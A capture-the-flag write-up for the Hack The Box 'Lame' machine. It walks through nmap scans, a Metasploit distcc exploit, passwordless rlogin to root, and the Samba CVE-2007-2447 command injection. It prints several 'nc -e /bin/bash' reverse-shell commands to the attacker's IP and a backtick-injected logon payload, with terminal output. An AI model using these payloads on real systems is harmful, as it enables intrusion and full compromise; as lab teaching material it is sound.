---
title: Hack The Box&#58; Lame
permalink: /HTB/Lame
layout: default
---
<img src="https://github.com/susMdT/Nigerald/blob/master/assets/images/Lame_Big.png?raw=true" unselectable="on" class="Box_Logo" />

Lame is an easy level box on HackTheBox and covers many basics. There are multiple approaches for this box and overall it was pretty fun. My approach was to exploit the `distccd` service to gain a foothold, and then using `rlogin` to gain root, as it required no password.

# Walkthrough
Start off by performing a complete, general nmap scan `nmap -p-`
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```
Note that `distccd`, an exploitable service, is running. Remote code execution is possible through Metasploit. Using `exploit/unix/misc/distcc_exec`, set the payload to `cmd/unix/generic` with the command as `echo "nc -e /bin/bash <ip> <port>" > b.sh ; ./b.sh`. The options should look similar to this
```
Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/generic):

   Name  Current Setting                                                                     Required  Description
   ----  ---------------                                                                     --------  -----------
   CMD   echo "nc -e /bin/bash 10.10.14.4 4444" > b.sh ; chmod +x ./b.sh ; ./b.sh            yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
   ```
This payload creates a script for a reverse shell on the victim machine, makes it executable, then executes it. So before this exploit is run, make sure you have a listener open on your host with `nc -nvlp <port>`. After receiving a connection and upgrading our shell with `python -c 'import pty; pty.spawn("/bin/bash")`, we should have something like this:
```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 52475
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$ 
```
Enumerating further with `nmap localhost` gives us much more information now.
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
953/tcp  open  rndc
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
3632/tcp open  distccd
4444/tcp open  krb524
5432/tcp open  postgres
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
```
Port 513, rlogin, is dated and vulnerable by default and doesn't require password by default. This can be exploited with `rlogin localhost -l root`.
```
daemon@lame:/tmp$ rlogin localhost -l root
rlogin localhost -l root
Last login: Thu Sep 30 10:48:49 EDT 2021 from :0.0 on pts/0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~#
```
We have successfully rooted the machine.

# Bonus
Something to note about this box is how many attack vectors there are and false leads. Version numbers for many services running were exploitable, but I had not done that on my initial attempt. 

## Alternate Approach: SMB 3.0.20, No metasploit
Doing a more detailed nmap scan, checking version numbers and using scripts with `nmap -sC -sV`, we can find that Samba is running.
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```
Googling the version (3.0.20), we can find that this version along with others between 3.0.0 and 3.0.25, are vulnerable to remote code execution (CVE-2007-2447). First, enumeration of the available shares is necessary through `smbmap -H 10.10.10.3`:
```
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```
Since access to the /tmp share is given, an attacker can connect to it and utilize the CVE. Connect to it via `smbclient //10.10.10.3/tmp`:
```
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
Anonymous logon was granted so that is why access was possible. From the Samba terminal, RCE is possible in this version. Running the command ``logon "./=`nohup nc -e /bin/sh <local ip> <local port>`"`` in the Samba terminal while having a listener on the attacking machine with `nc -nvlp <local port>` returns an error in the Samba terminal
```
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.4 4444`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT
```
But on the listener, the attacker actually gains a root shell.
```
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 38533
whoami
root
```

## Alternate Approach: SMB 3.0.20, with Metasploit
Metasploit makes usages of the CVE much easier. Simply searching for this Samba version in the Metasploit console with `search exploit samba 3.0.20` returns
```
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```
Using this exploit while setting our options
```
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <local ip>       yes       The listen address (an interface may be specified)
   LPORT  <local port>     yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
Will give us a root shell just like the previous method shown.
## Failed Attack Vectors
There were many failed attack vectors, some of the notable ones were: FTP and MySQL no root password. This FTP version (2.3.4) is vulnerable to an exploit that didn't work. Additionally, access to the locally hosted MySql database as the root user required no password, but the credentials and information found in the database weren't applicable anywhere.

--Dylan Tran 9/30/21
